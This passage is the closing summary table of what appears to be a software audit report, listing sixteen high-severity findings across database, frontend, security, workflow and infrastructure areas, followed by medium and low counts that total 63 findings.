| **HIGH** | HIGH-01 | Database | Document lock TOCTOU race condition | Medium |
| **HIGH** | HIGH-02 | Database | Non-deterministic GT job migration | Low |
| **HIGH** | HIGH-03 | Database | Silent document reference nulling | Low |
| **HIGH** | HIGH-04 | Frontend | Missing error handling on approve/skip | Low |
| **HIGH** | HIGH-05 | Frontend | PDF document proxy memory leak | Low |
| **HIGH** | HIGH-06 | Frontend | Image load race condition | Low |
| **HIGH** | HIGH-07 | Security | Content-Disposition header injection | Low |
| **HIGH** | HIGH-08 | Security | Stack traces in debug log API | Low |
| **HIGH** | HIGH-09 | Temporal | Cleanup failure leaves run stuck | Low |
| **HIGH** | HIGH-10 | Temporal | Retryable error for non-transient failure | Low |
| **HIGH** | HIGH-11 | Temporal | Blind spellcheck replacement | Medium |
| **HIGH** | HIGH-12 | Infra | TLS verification disabled everywhere | Medium |
| **HIGH** | HIGH-13 | Infra | Open NetworkPolicy allows all ingress | Low |
| **HIGH** | HIGH-14 | Infra | 10-year service account token | Low |
| **HIGH** | HIGH-15 | Frontend | Stale closures from eslint suppressions | Medium |
| **HIGH** | HIGH-16 | Frontend | Missing async cancellation | Low |
| **MEDIUM** | MED-01–22 | Various | 22 findings (see sections above) | Various |
| **LOW** | LOW-01–15 | Various | 15 findings (see sections above) | Various |

**Totals:** 10 Critical, 16 High, 22 Medium, 15 Low = **63 findings**
